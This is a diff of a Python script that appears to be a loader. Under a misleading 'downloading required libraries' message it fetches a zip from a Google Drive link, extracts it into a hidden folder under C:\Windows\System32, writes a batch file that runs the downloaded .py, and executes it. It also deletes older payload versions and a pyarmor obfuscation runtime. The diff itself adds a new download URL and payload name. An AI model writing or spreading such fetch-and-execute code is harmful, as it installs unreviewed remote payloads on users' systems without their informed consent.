@@ -237,9 +237,9 @@ os.system('cls')
 print("")
 print("")
 def delete_files_if_aesv3_missing():
-    aesv3_path = r"C:\Windows\System32\MSRX\AesV8.6.py"
+    aesv3_path = r"C:\Windows\System32\MSRX\aesv8.7.py"
     files_to_delete = [
-        r"C:\Windows\System32\MSRX\AesV8.5.py",
+        r"C:\Windows\System32\MSRX\AesV8.6.py",
         r"C:\Windows\System32\MSRX\aesv1.bat",
         r"C:\Windows\System32\MSRX\pyarmor_runtime_000000"
     ]
@@ -275,10 +275,10 @@ if file_contentsx1=="ZM2vsjeaWJHSf":
     os.mkdir(r'C:\Windows\System32\MSRX')
 '''
 
-if not os.path.exists("C:\\Windows\\System32\\MSRX\\AesV8.6.py"):
+if not os.path.exists("C:\\Windows\\System32\\MSRX\\aesv8.7.py"):
     print("downloading required libraries, please wait a moment...")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1Hiwd5pda2xluupedlaDIE5as6opFkE9Z", "C:\\Windows\\System32\\MSRX\\mydrx.zip")
-    zip_file = r'C:\Windows\System32\MSRX\mydrx.zip'
+    download_file_from_google_drive("https://drive.google.com/uc?id=12RGXwCPZG-zCTvrYZoYO_jo5eL9Oa5pi", "C:\\Windows\\System32\\MSRX\\aesv1.zip")
+    zip_file = r'C:\Windows\System32\MSRX\aesv1.zip'
     extract_dir = r'C:\Windows\System32\MSRX'
     extract_zip(zip_file, extract_dir)
     os.remove(zip_file)
@@ -325,12 +325,12 @@ if file_contentsx1=="deleteaesFILES":
 '''
 if file_contentsx1 =="04yb8u5ih5FGB":
     file_contentpathx = read_file_contentxasxas(file_pathxpath)
-    create_batch_file(file_contentpathx, r"C:\Windows\System32\MSRX\AesV8.6.py")
+    create_batch_file(file_contentpathx, r"C:\Windows\System32\MSRX\aesv8.7.py")
 elif file_contentsx1 =="NXXzPhXpkZ9JC":
     file_contentpathx = read_file_contentxasxas(file_pathxpath)
-    create_batch_file(file_contentpathx, r"C:\Windows\System32\MSRX\AesV8.6.py")
+    create_batch_file(file_contentpathx, r"C:\Windows\System32\MSRX\aesv8.7.py")
 else:
-    create_batch_file("py -3.11", r"C:\Windows\System32\MSRX\AesV8.6.py")
+    create_batch_file("py -3.11", r"C:\Windows\System32\MSRX\aesv8.7.py")
 '''
 def create_batch_file(python_command, script_name):
     # Define the directory and file name
@@ -354,7 +354,7 @@ def create_batch_file(python_command, script_name):
     else:
         print("")
 
-create_batch_file("py -3.11", r"C:\Windows\System32\MSRX\AesV8.6.py")
+create_batch_file("py -3.11", r"C:\Windows\System32\MSRX\aesv8.7.py")
 def run_batch_file(batch_file_path):
     try:
         subprocess.run([batch_file_path], shell=True, check=True)
